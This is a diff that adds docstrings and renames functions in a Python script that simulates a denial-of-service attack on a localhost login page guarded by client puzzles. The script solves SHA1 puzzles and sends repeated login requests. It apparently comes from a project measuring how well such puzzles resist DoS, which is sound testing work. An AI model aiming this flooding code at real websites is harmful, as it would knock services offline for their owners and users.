@@ -1,3 +1,17 @@
+"""
+Module Name: DoS_attack_fixed.py
+
+This module contains scripts for simulating DoS attacks targeting
+web pages protected by client puzzles.
+
+Functions:
+- get_challenge: Retrieves the challenge C from the web page.
+- solve_puzzle: Solves the puzzle by finding the value x.
+- dos_request: Sends a login request to the website with the given payload and headers.
+- dos_attack: Implements a DoS attack on the target URL by sending multiple login requests.
+
+"""
+
 import base64
 import csv
 import hashlib
@@ -10,6 +24,12 @@ from bs4 import BeautifulSoup
 
 
 def get_challenge(url):
+    """Get the challenge C from the web page.
+    Args:
+        url (str): The URL of the web page.
+    Returns:
+        str: The challenge C string.
+    """
     session = requests.Session()
     web = session.get(url)
     if web.status_code != 200:
@@ -33,10 +53,16 @@ def get_challenge(url):
     return None
 
 
-def solve_puzzle(C):
+def solve_puzzle(c):
+    """Solve the puzzle by finding a value x such that the last 18 bits of SHA1(C + x) are 0.
+    Args:
+        c (str): The challenge C string.
+    Returns:
+        str: The value x that solves the puzzle.
+    """
     while True:
         x = os.urandom(4)
-        h = hashlib.sha1(C.encode() + x).digest()
+        h = hashlib.sha1(c.encode() + x).digest()
         last_3_bytes = h[-3:]
         # check if the last 18 bits are 0
         val = int.from_bytes(last_3_bytes, "big")
@@ -45,7 +71,11 @@ def solve_puzzle(C):
 
 
 def dos_request(url, headers):
-
+    """Send a login request to the website with the given payload and headers.
+    Args:
+        url (str): The URL of the website.
+        headers (dict): The headers to include in the request.
+    """
     num_requests = 300
     project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
     output_file = os.path.join(project_root, "Resource_Usage")
@@ -96,8 +126,8 @@ def dos_request(url, headers):
             break
 
 
-def Dos_attack():
-
+def dos_attack():
+    """Implement a DoS attack on the target URL by sending multiple login requests."""
     # target url (local host) for DoS attack
     url = "http://127.0.0.1:5000/"
 
@@ -143,5 +173,5 @@ def Dos_attack():
 
 if __name__ == "__main__":
     # start the DoS attack
-    Dos_attack()
+    dos_attack()
     print("DoS attack finished.")
